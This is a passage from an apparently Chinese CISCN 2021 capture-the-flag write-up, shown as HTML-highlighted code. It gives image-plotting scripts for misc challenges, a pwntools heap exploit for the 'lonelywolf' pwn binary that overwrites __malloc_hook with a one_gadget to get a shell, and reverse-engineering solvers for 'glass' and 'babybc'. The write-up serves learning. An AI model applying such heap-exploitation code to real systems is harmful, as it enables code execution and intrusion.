class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag_image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"./flag.png"</span><span class="token punctuation">)</span></code></pre><p>得到如下图</p><img src="/article/ciscn2021/image-20210516051514950.png" class="" title="image-20210516051514950" loading="lazy"><p>纯手动一点一点慢慢拼出了flag</p><img src="/article/ciscn2021/image-20210515184657362.png" class="" title="image-20210515184657362" loading="lazy"><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;12504d0f-9de1-4b00-87a5-a5fdd0986a00&#125;</code></pre><h3 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h3><p><code>strings cap.pcapng</code>可以看到有坐标轴，坐标轴为三维坐标，但由于z轴大多数为0，所以可以用二维画图，</p><img src="/article/ciscn2021/image-20210517144021953.png" class="" title="image-20210517144021953" loading="lazy"><p>直接用上面的脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageDrawflag_image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'zuobiao.txt'</span><span class="token punctuation">)</span>draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>flag_image<span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    point <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>    flag_image<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag_image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"./flag.png"</span><span class="token punctuation">)</span></code></pre><p>得到图片：</p><img src="/article/ciscn2021/image-20210517144052457.png" class="" title="image-20210517144052457" loading="lazy"><p>md5加密之后就得到flag：CISCN{d4f1fb80bc11ffd722861367747c0f10}</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="longlywolf"><a href="#longlywolf" class="headerlink" title="longlywolf"></a>longlywolf</h3><p>exp：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> base64context<span class="token punctuation">.</span>os <span class="token operator">=</span> <span class="token string">'linux'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./lonelywolf'</span><span class="token punctuation">)</span><span class="token comment">#p = remote('127.0.0.1',12345)</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./lonelywolf'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> binary<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x521</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span> payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x70</span>malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f3d5</span><span class="token punctuation">,</span><span class="token number">0x4f432</span><span class="token punctuation">,</span><span class="token number">0x10a41c</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> one<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'malloc_hook'</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  free<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h3><pre class="language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xa3</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0xe3</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">,</span><span class="token number">0xbb</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0x84</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0xc2</span><span class="token punctuation">,</span><span class="token number">0xad</span><span class="token punctuation">,</span><span class="token number">0xad</span><span class="token punctuation">,</span><span class="token number">0x9e</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0x5</span><span class="token punctuation">,</span><span class="token number">0x2</span><span class="token punctuation">,</span><span class="token number">0x1f</span><span class="token punctuation">,</span><span class="token number">0x8e</span><span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">,</span><span class="token number">0x4f</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0xeb</span><span class="token punctuation">,</span><span class="token number">0xaf</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">0xea</span><span class="token punctuation">,</span><span class="token number">0xc4</span><span class="token punctuation">,</span><span class="token number">0xa8</span><span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0xc7</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">,</span><span class="token number">0xd3</span><span class="token punctuation">,</span><span class="token number">0xcc</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0xf9</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token string">'12345678'</span>number <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    number<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    b <span class="token operator">=</span> number<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    a <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    number<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> number<span class="token punctuation">[</span>a<span class="token punctuation">]</span>    number<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token number">0</span>c <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    b <span class="token operator">=</span> number<span class="token punctuation">[</span>a<span class="token punctuation">]</span>    c <span class="token operator">=</span> <span class="token punctuation">(</span>c <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    number<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> number<span class="token punctuation">[</span>c<span class="token punctuation">]</span>    number<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">=</span> b    key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> number<span class="token punctuation">[</span><span class="token punctuation">(</span>b <span class="token operator">+</span> number<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><h3 id="babybc"><a href="#babybc" class="headerlink" title="babybc"></a>babybc</h3><p>用到 LLVM，再IDA打开</p><p>两个函数，写了各种限制</p><pre class="language-none"><code class="language-none">横row 0001 1000 2001 0000 1010map[0][3] &gt; map[0][4]map[1][0] &gt; map[1][1]map[2][0] &lt; map[2][1]map[2][3] &gt; map[2][4]map[4][0] &gt; map[4][1]map[4][2] &gt; map[4][3]纵col 00202 00000 00010 01001map[0][2] &gt; map[1][2]map[0][4] &gt; map[1][4]map[2][3] &lt; map[3][3]map[3][1] &lt; map[4][1]map[3][4] &lt; map[4][3]</code></pre><p>exp：</p><pre class="language-python" data-language="python"><code class="language-python">num1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num5 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3  <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4 <span class="token keyword">or</span> i4 <span class="token operator">&lt;=</span> i5<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i2 <span class="token operator">>=</span> i1 <span class="token keyword">or</span> i2 <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i1 <span class="token operator">>=</span> i2<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i4 <span class="token operator">>=</span> <span class="token number">3</span> <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4 <span class="token keyword">or</span> i5 <span class="token operator">>=</span> i4<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token 